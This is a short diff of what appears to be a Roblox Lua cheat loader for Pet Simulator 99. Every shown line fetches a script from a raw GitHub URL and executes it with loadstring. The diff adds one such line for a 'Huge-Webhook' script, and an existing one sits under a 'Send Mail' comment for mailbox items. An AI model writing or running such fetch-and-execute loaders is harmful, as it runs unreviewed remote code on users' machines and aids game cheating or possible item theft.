@@ -4,6 +4,10 @@
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Mastery"))()
 
+spawn(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Huge-Webhook-Suu"))()
+end)
+
 --- Gửi Mail ---
 task.wait(15)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Mailbox-Items-Suu"))()
